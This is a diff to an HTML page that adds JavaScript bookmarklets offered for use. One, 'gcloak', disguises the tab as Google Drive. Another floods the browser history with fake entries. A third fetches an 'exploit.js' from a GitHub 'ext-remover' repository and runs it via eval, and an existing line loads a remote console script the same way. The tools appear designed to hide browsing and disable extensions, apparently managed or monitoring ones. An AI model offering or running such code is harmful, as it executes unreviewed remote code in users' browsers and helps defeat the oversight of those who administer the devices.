@@ -50,8 +50,15 @@
     <p>javascript:(function()%7B(function()%20%7Bvar%20x%20%3D%20document.createElement(%22script%22)%3Bx.src%20%3D%20%22https%3A%2F%2Fcdn.jsdelivr.net%2Fgh%2FSnowLord7%2Fdevconsole%40master%2Fmain.js%22%3Bx.onload%20%3D%20alert(%22Loaded%20Developer%20Console!%22)%3Bdocument.head.appendChild(x)%3B%7D)()%7D)()</p>
     <p></p>
     <p>changes current name to my google drive:</p>
-    <p></p></p>
-    
+    <p></p>
+    <p>javascript:function gcloak() { var link = document.querySelector("link[rel*='icon']") || document.createElement('link');link.type = 'image/x-icon';link.rel = 'shortcut icon';link.href = 'https://www.pngall.com/wp-content/uploads/9/Google-Drive-Logo-Transparent-180x180.png';document.title = 'My Drive - Google Drive';console.log(document.title);document.getElementsByTagName('head')[0].appendChild(link) };gcloak();setInterval(gcloak, 1000);</p>
+    <p>history flooder:</p>
+    <p></p>
+    <p>javascript:var num=prompt("History flood amount:");done=false;x=window.location.href;for (var i=1; i<=num; i++){history.pushState(0, 0, i==num?x:i.toString());if(i==num){done=true}}if(done===true){alert("History flood successful! "+window.location.href+" now appears in your history "+num+(num==1?" time.":" times."))}</p>
+    <p></p>
+    <p>extention hub? idk</p>
+    <p></p>
+    <p>javascript:void fetch(`https://raw.githubusercontent.com/3kh0/ext-remover/main/exploit.js`).then(d=>d.text()).then(eval);</p>
     <div id="browser-container" style="width: 100%; height: 100%;"></div>
 
     <!-- Load the CEF library and create the browser instance -->
